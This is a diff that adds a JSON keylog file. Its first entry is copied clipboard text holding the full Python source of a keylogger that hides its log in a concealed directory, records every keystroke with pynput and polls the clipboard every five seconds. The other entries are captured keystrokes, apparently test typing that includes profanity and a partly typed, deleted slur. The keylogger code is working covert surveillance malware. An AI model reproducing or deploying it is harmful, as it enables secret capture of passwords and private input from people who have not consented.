@@ -1,0 +1,233 @@
+[
+    {
+        "timestamp": "2024-10-22 16:26:33.432762",
+        "copied": "import os\nimport json\nimport pyperclip\nfrom pynput import keyboard\nfrom datetime import datetime, timedelta\nimport platform\n\n# Directory and file setup\ndef get_hidden_dir():\n    if os.name == 'nt':  # Windows\n        path = os.path.join(os.environ['ProgramData'], 'hidden_dir')\n    else:  # Linux/macOS\n        path = os.path.expanduser('~/.hidden_dir')\n    if not os.path.exists(path):\n        os.makedirs(path)\n    return path\n\njson_file_path = os.path.join(get_hidden_dir(), 'keylog.json')\n\n# Initialize JSON log file\nif not os.path.exists(json_file_path):\n    with open(json_file_path, 'w') as file:\n        json.dump([], file)\n\n# Load existing data from JSON file\ndef load_json_data():\n    with open(json_file_path, 'r') as file:\n        return json.load(file)\n\n# Save data to JSON file\ndef save_json_data(data):\n    with open(json_file_path, 'w') as file:\n        json.dump(data, file, indent=4)\n\n# Check if Caps Lock is active (cross-platform)\ndef is_capslock_on():\n    if platform.system() == 'Windows':\n        # Windows-specific Caps Lock check\n        import ctypes\n        return ctypes.WinDLL('User32.dll').GetKeyState(0x14) != 0\n    elif platform.system() == 'Darwin':  # macOS\n        # macOS-specific Caps Lock check\n        import Quartz\n        caps_lock_state = Quartz.CGEventSourceFlagsState(Quartz.kCGEventSourceStateHIDSystemState)\n        return (caps_lock_state & Quartz.kCGEventFlagMaskAlphaShift) != 0\n    else:\n        # Linux-specific Caps Lock check\n        import subprocess\n        xset_output = subprocess.check_output(['xset', 'q']).decode()\n        return 'Caps Lock:   on' in xset_output\n\n# Variable to track the last timestamp and clipboard content\nlast_timestamp = datetime.now() - timedelta(minutes=15)  # Set to 15 min before current time\nlast_clipboard_content = None  # Store last clipboard content\n\n# Function to log keystrokes with timestamp every 15 minutes\ndef log_keystroke(key):\n    global last_timestamp\n\n    current_time = datetime.now()\n    key_data = str(key).replace(\"'\", \"\")\n\n    if key == keyboard.Key.space:\n        key_data = ' '\n    elif key == keyboard.Key.enter:\n        key_data = '\\n'\n\n    # Check if the Caps Lock is on and adjust the key logging\n    if is_capslock_on() and key_data.isalpha():\n        key_data = key_data.upper()\n\n    data = load_json_data()\n\n    # Log timestamp if more than 15 minutes have passed since the last one\n    if current_time - last_timestamp >= timedelta(minutes=15):\n        data.append({\n            'timestamp': str(current_time),\n            'event': 'Timestamp logged'\n        })\n        last_timestamp = current_time\n\n    # Log the key press\n    data.append({\n        'key': key_data\n    })\n\n    save_json_data(data)\n\n# Function to log clipboard content only when it changes\ndef log_clipboard():\n    global last_clipboard_content\n\n    current_time = datetime.now()\n    clipboard_data = pyperclip.paste()\n\n    if clipboard_data != last_clipboard_content and clipboard_data:  # Check if clipboard content has changed\n        data = load_json_data()\n\n        # Log clipboard content\n        data.append({\n            'timestamp': str(current_time),\n            'copied': clipboard_data\n        })\n\n        save_json_data(data)\n\n        # Update the last clipboard content\n        last_clipboard_content = clipboard_data\n\n# Listener for keyboard events\ndef on_press(key):\n    try:\n        log_keystroke(key)\n    except Exception as e:\n        pass\n\n# Run keyboard listener\nlistener = keyboard.Listener(on_press=on_press)\nlistener.start()\n\n# Periodically check clipboard content (every 5 seconds)\nimport time\nwhile True:\n    log_clipboard()\n    time.sleep(5)  # Check clipboard every 5 seconds\n"
+    },
+    {
+        "timestamp": "2024-10-22 16:26:44.560185",
+        "event": "Timestamp logged"
+    },
+    {
+        "key": "Key.ctrl"
+    },
+    {
+        "key": "c"
+    },
+    {
+        "timestamp": "2024-10-22 16:26:48.471371",
+        "copied": "Always keep adapting"
+    },
+    {
+        "key": "\n"
+    },
+    {
+        "key": "\n"
+    },
+    {
+        "key": "Key.caps_lock"
+    },
+    {
+        "key": "F"
+    },
+    {
+        "key": "Key.caps_lock"
+    },
+    {
+        "key": "u"
+    },
+    {
+        "key": "c"
+    },
+    {
+        "key": "k"
+    },
+    {
+        "key": " "
+    },
+    {
+        "key": "t"
+    },
+    {
+        "key": "h"
+    },
+    {
+        "key": "i"
+    },
+    {
+        "key": "s"
+    },
+    {
+        "key": " "
+    },
+    {
+        "key": "Key.caps_lock"
+    },
+    {
+        "key": "S"
+    },
+    {
+        "key": "H"
+    },
+    {
+        "key": "I"
+    },
+    {
+        "key": "T"
+    },
+    {
+        "key": "Key.caps_lock"
+    },
+    {
+        "key": "\n"
+    },
+    {
+        "key": "n"
+    },
+    {
+        "key": "i"
+    },
+    {
+        "key": "g"
+    },
+    {
+        "key": "g"
+    },
+    {
+        "key": "a"
+    },
+    {
+        "key": "Key.backspace"
+    },
+    {
+        "key": "Key.backspace"
+    },
+    {
+        "key": "Key.backspace"
+    },
+    {
+        "key": "Key.backspace"
+    },
+    {
+        "key": "Key.backspace"
+    },
+    {
+        "key": "n"
+    },
+    {
+        "key": "i"
+    },
+    {
+        "key": "g"
+    },
+    {
+        "key": "g"
+    },
+    {
+        "key": "a"
+    },
+    {
+        "key": "Key.backspace"
+    },
+    {
+        "key": "Key.backspace"
+    },
+    {
+        "key": "Key.backspace"
+    },
+    {
+        "key": "Key.backspace"
+    },
+    {
+        "key": "Key.backspace"
+    },
+    {
+        "key": "l"
+    },
+    {
+        "key": "o"
+    },
+    {
+        "key": "l"
+    },
+    {
+        "key": "\n"
+    },
+    {
+        "key": "Key.shift"
+    },
+    {
+        "key": "{"
+    },
+    {
+        "key": "}"
+    },
+    {
+        "key": "\n"
+    },
+    {
+        "key": "Key.shift"
+    },
+    {
+        "key": "\""
+    },
+    {
+        "key": "Key.end"
+    },
+    {
+        "key": " "
+    },
+    {
+        "key": "Key.shift"
+    },
+    {
+        "key": "!"
+    },
+    {
+        "key": "n"
+    },
+    {
+        "key": "o"
+    },
+    {
+        "key": "t"
+    },
+    {
+        "key": "Key.shift"
+    },
+    {
+        "key": "#"
+    },
+    {
+        "key": "$"
+    },
+    {
+        "key": "&"
+    },
+    {
+        "key": "^"
+    },
+    {
+        "key": "%"
+    },
+    {
+        "key": "Key.shift"
+    },
+    {
+        "key": "+"
+    },
+    {
+        "key": "+"
+    },
+    {
+        "key": "Key.shift"
+    },
+    {
+        "key": "_"
+    },
+    {
+        "key": "Key.alt"
+    },
+    {
+        "key": "Key.tab"
+    }
+]
